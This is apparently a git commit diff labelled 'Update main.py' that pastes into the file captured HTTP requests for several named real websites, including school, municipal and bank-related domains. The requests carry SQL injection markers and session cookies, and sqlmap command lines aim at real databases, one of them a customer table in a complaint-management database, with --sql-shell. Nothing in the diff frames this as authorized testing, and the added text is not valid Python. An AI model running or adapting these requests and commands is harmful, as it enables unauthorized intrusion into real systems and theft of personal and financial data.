85164c7b81a7ac828ef640c54427f3b1c0707387
cheveyo1 <138849762+cheveyo1@users.noreply.github.com>
2023-08-25 20:59:13 +0800

    Update main.py

--- main.py
+++ main.py
@@ -30,6 +30,65 @@ if __name__ == "__main__":
 
 
 
+
+POST /forget.aspx HTTP/1.1
+X-Requested-With: XMLHttpRequest
+Referer: http://dcprequirement.in/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 501
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Encoding: gzip,deflate,br
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+Host: dcprequirement.in
+Connection: Keep-alive
+
+Button3=Submit&__EVENTVALIDATION=XOkjFkkZh9ca4R1Fod4rGg0Vg7YZKGZ7T28NjGzNRbpQlIQlF9V2Jfrrimb9ndvxC34tBljc0/zcJRlm/GSp5iAM%2BJWgxpOceTa5GMqQxqCkgH2dXDEIw3w0kSjSNw3blEoxApsMDfqNdWmnucmw4I6m3iuRRjo0S/kY2pQyzeHAPgAAz150UmOtIDqsqxWS&__VIEWSTATE=UmKOAwh/CI9H0lMKbYve5cDmvKh1Ap70VKogDGlB5DMaoHTp/cJF2ck0ZudX2GYp/7/gxNZnuGoPQxl9vX1n63jt/yaBfMUHBCvASl7GUzq/tlZDRQe18CGPiyqiASmaI5PvR31sM2XjyeiBkrRYJQ==&__VIEWSTATEGENERATOR=3C6E097E&txtDate=-1*&txtmobile=987-65-4329
+
+
+GET /gallery?search=the HTTP/1.1
+X-Requested-With: XMLHttpRequest
+Referer: https://stlawrencehighschool.edu.in/
+Cookie: ci_session=e3670c31afc629687450364ffd49854a7ac7c3af
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Encoding: gzip,deflate,br
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+Host: stlawrencehighschool.edu.in
+Connection: Keep-alive
+
+
+
+GET /SMKCSection.aspx?deptcode=1 HTTP/1.1
+Referer: https://smkc.gov.in/
+Cookie: ASP.NET_SessionId=gredp31eevaucsaetbyxie1w; CultureInfo=mr-IN
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Encoding: gzip,deflate,br
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+Host: smkc.gov.in
+Connection: Keep-alive
+
+
+
+
+GET /cat/Kerala/Kannur/?id=1* HTTP/1.1
+User-Agent: 1'"2000
+referer: 1'"3000
+client-ip: 1'"4000
+x-forwarded-for: 1'"5000
+accept-language: 1'"6000
+via: 1'"7000
+Cookie: ASP.NET_SessionId=r2tvxtk41yhfs53cpc4vyedx
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Encoding: gzip,deflate,br
+Host: ocat.in
+Connection: Keep-alive
+
+
+
+
+
+
+
+
 sh-3.2# python3  ../sqlmap.py -r drmertm.in.dic   --random-agent -risk 3   --technique=E  -D drmeulqx_drmertm  --sql-shell  --no-cast  --tables 
 
 python3 sqlmap.py  -r ./test/centralbankofindia.co.in.dic  --random-agent --risk 3  --technique=U  -D complaint_management -T tbl_customer  --sql-shell    --batch --no-cast
